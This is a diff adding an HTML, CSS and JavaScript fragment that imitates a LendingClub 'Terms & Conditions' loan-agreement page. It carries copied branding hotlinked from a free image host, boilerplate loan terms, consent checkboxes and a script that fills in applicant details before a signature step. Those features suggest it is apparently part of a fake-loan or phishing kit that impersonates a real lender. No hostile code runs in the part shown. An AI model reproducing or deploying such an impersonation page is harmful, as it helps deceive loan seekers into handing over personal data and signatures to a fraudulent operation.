@@ -1,0 +1,271 @@
+<style>
+/* ── c_forma_v1 — Terms & Conditions ── */
+:root {
+  --lc-navy: #113b5e;
+  --lc-blue: #82cde5;
+  --lc-orange: #f43d1d;
+  --text-dark: #2c3e50;
+  --text-light: #6c757d;
+  --bg-light: #f8f9fa;
+  --border-light: #e9ecef;
+  --success-green: #45a049;
+  --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
+  --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+  --border-radius: 12px;
+}
+.frag-contract {
+  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 20px;
+}
+.card {
+  background: #fff;
+  border-radius: 16px;
+  box-shadow: var(--shadow-lg);
+  overflow: hidden;
+  margin-bottom: 20px;
+  width: 100%;
+  max-width: 560px;
+}
+.card-header {
+  background: linear-gradient(90deg, var(--lc-navy), #0c2c46);
+  padding: 22px;
+  text-align: center;
+}
+.card-header img {
+  max-width: 200px;
+  filter: brightness(0) invert(1);
+}
+.card-body { padding: 28px; }
+.card-title {
+  font-size: 24px;
+  font-weight: 600;
+  color: var(--text-dark);
+  margin-bottom: 8px;
+  text-align: center;
+  font-family: 'Playfair Display', serif;
+}
+.card-subtitle {
+  font-size: 14px;
+  color: var(--text-light);
+  text-align: center;
+  margin-bottom: 22px;
+}
+.terms-container {
+  background: var(--bg-light);
+  border-radius: 10px;
+  padding: 18px;
+  max-height: 330px;
+  overflow-y: auto;
+  margin-bottom: 18px;
+  border: 1px solid var(--border-light);
+  font-size: 13.5px;
+  color: var(--text-light);
+  line-height: 1.7;
+}
+.terms-container h4 {
+  font-size: 15px;
+  color: var(--text-dark);
+  margin-bottom: 12px;
+  margin-top: 14px;
+}
+.terms-container strong { color: var(--text-dark); }
+.checkbox-group {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-bottom: 12px;
+  padding: 13px;
+  background: var(--bg-light);
+  border-radius: 10px;
+  cursor: pointer;
+  transition: var(--transition);
+  border: 1px solid transparent;
+}
+.checkbox-group:hover { background: #eef2f7; border-color: var(--lc-blue); }
+.checkbox-group input[type="checkbox"] {
+  width: 18px;
+  height: 18px;
+  margin-top: 2px;
+  cursor: pointer;
+  accent-color: var(--lc-navy);
+  flex-shrink: 0;
+}
+.checkbox-group label {
+  font-size: 13.5px;
+  color: var(--text-dark);
+  cursor: pointer;
+  line-height: 1.5;
+}
+.continue-btn {
+  width: 100%;
+  padding: 15px;
+  background: #121212;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition);
+  margin-top: 6px;
+}
+.continue-btn:hover:not(:disabled) {
+  background: linear-gradient(270deg, #00ad6a, #0f263c);
+}
+.continue-btn:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+  opacity: 0.7;
+}
+/* Footer */
+.lc-footer {
+  width: 100%;
+  max-width: 560px;
+}
+.footabv { border-top: 3px solid #82cde5; line-height: 0; }
+.footabv img { width: 100%; display: block; }
+.footfinal {
+  background: linear-gradient(135deg, #113b5e 0%, #1a4a70 100%);
+  padding: 24px 20px;
+  text-align: center;
+}
+.footfinal img { max-width: 180px; margin: 0 auto; display: block; }
+.finalfoottxt {
+  background: #113b5e;
+  color: white;
+  text-align: center;
+  padding: 24px 20px;
+}
+.finalfoottxt .addr { color: rgba(255,255,255,0.9); font-size: 13px; margin-bottom: 10px; line-height: 1.6; }
+.finalfoottxt .rights { color: #82cde5; font-size: 13px; margin-bottom: 8px; }
+.finalfoottxt .rights2 { color: rgba(255,255,255,0.6); font-size: 11px; }
+@media (max-width: 600px) {
+  .card-body { padding: 18px; }
+  .card-title { font-size: 20px; }
+}
+</style>
+
+<div class="frag-contract">
+
+  <!-- Terms Card -->
+  <div class="card">
+    <div class="card-header">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+    </div>
+    <div class="card-body">
+      <h2 class="card-title">Terms &amp; Conditions</h2>
+      <p class="card-subtitle">Please review and accept our terms to continue</p>
+
+      <div class="terms-container">
+        <h4>Lending Club Unsecured Loan Agreement And Final Disclosure Statement.</h4>
+        <h4>Welcome <strong><span id="terms-client-name">Valued Client</span></strong>,<br>
+        By proceeding, you agree to the following terms:</h4><br>
+        <strong>Loan Details:</strong>
+        <span id="terms-loan-amount"></span> &nbsp;|&nbsp;
+        <span id="terms-tenure"></span> &nbsp;|&nbsp;
+        <span id="terms-emi"></span> &nbsp;|&nbsp;
+        <span id="terms-apr"></span><br>
+        <strong>Effective Date:</strong> <span id="terms-effective-date"></span><br>
+        <strong>Application ID:</strong> <span id="terms-application-id"></span><br>
+        <span id="terms-first-name" style="display:none;"></span>
+        <span id="terms-last-name"  style="display:none;"></span>
+        <br>
+        <strong>IMPORTANT: PLEASE READ THIS AGREEMENT CAREFULLY AND IN ITS ENTIRETY BEFORE AGREEING TO THE TERMS BELOW.</strong><br><br>
+        <strong>I. INTRODUCTION</strong><br>
+        This Unsecured Loan Agreement "<span id="terms-application-id-inline"></span>" is entered into between <em>LendingClub</em> (the "Lender") and you (the "Borrower").<br><br>
+        This Agreement governs unsecured personal loans between USD $1,000 to USD $40,000 at a fixed APR of 8.99%.<br><br>
+        <strong>II. DEFINITIONS</strong><br>
+        • "Loan" means the principal amount plus applicable charges.<br>
+        • "APR" means Annual Percentage Rate of 8.99%.<br>
+        • "Disbursement" refers to fund transfer into the Borrower's account.<br><br>
+        <strong>III. LOAN PURPOSE</strong><br>
+        Loan proceeds shall only be used for lawful personal or professional needs. Prohibited uses include illicit activity, speculation, and gambling.<br><br>
+        <strong>IV. TERMS OF REPAYMENT</strong><br>
+        <strong>A. Principal and Interest:</strong> Repay in monthly installments per amortized schedule.<br>
+        <strong>B. Payment Method:</strong> Via ACH or approved digital channels.<br>
+        <strong>C. Late Payments:</strong> A fee of $25 or 5% of overdue amount (whichever is higher) applies after 15 days.<br><br>
+        <strong>V. PREPAYMENT</strong><br>
+        You may prepay all or part of the loan at any time without penalty.<br><br>
+        <strong>VI. DEFAULT</strong><br>
+        Events of Default: Missing payments 30+ days, providing false details, filing bankruptcy.<br>
+        Remedies: Lender may report to credit bureaus, engage collections, or seek legal remedies.<br><br>
+        <strong>VII. DATA RIGHTS</strong><br>
+        Borrower consents to identity verification, background checks, and third-party API lookups for risk assessment.<br><br>
+        <strong>VIII. DISPUTE RESOLUTION</strong><br>
+        All disputes shall be settled through binding arbitration under AAA rules. Class action waivers apply.<br><br>
+        <strong>IX. FINAL NOTICE</strong><br>
+        If you disagree with any part of this Agreement, discontinue usage immediately. Continued access affirms full acceptance.
+      </div>
+
+      <div class="checkbox-group" onclick="window._toggleTerms('terms1')">
+        <input type="checkbox" id="terms1">
+        <label for="terms1">I have read and agree to the <strong>Terms of Service</strong> and <strong>Privacy Policy</strong></label>
+      </div>
+      <div class="checkbox-group" onclick="window._toggleTerms('terms2')">
+        <input type="checkbox" id="terms2">
+        <label for="terms2">I consent to electronic signatures and communications</label>
+      </div>
+      <div class="checkbox-group" onclick="window._toggleTerms('terms3')">
+        <input type="checkbox" id="terms3">
+        <label for="terms3">I authorize LendingClub to verify my information</label>
+      </div>
+
+      <button class="continue-btn" id="termsNextBtn" disabled
+        onclick="window.openSignatureModal && window.openSignatureModal()">
+        Accept &amp; Continue
+      </button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="lc-footer">
+    <div class="footabv">
+      <img src="https://i.ibb.co/KXzT75T/lclady.png" alt="">
+    </div>
+    <div class="footfinal">
+      <img src="https://i.ibb.co/KXzs5My/Lending-Club.webp" alt="LendingClub Logo">
+    </div>
+    <div class="finalfoottxt">
+      <p class="addr">595 Market Street, Suite 200<br>San Francisco, California 94105</p>
+      <p class="rights">"LendingClub" and the "LC" symbol are trademarks of LendingClub Bank</p>
+      <p class="rights2">© 2026 LendingClub Bank. All rights reserved.</p>
+    </div>
+  </div>
+
+</div>
+
+<script>
+(function() {
+  // Checkbox toggle
+  window._toggleTerms = function(id) {
+    var cb = document.getElementById(id);
+    if (cb) cb.checked = !cb.checked;
+    _validateTerms();
+  };
+
+  function _validateTerms() {
+    var ok = ['terms1','terms2','terms3'].every(function(id) {
+      var el = document.getElementById(id);
+      return el && el.checked;
+    });
+    var btn = document.getElementById('termsNextBtn');
+    if (btn) btn.disabled = !ok;
+  }
+
+  // Attach change listeners
+  ['terms1','terms2','terms3'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.addEventListener('change', _validateTerms);
+  });
+
+  // Populate terms fields from stored app data
+  var appData = window.SPA && window.SPA.storage.get('app_data');
+  if (appData && window.SessionHandler && window.SessionHandler.AppGate) {
+    window.SessionHandler.AppGate.populateTermsPage(appData);
+  }
+})();
+</script>
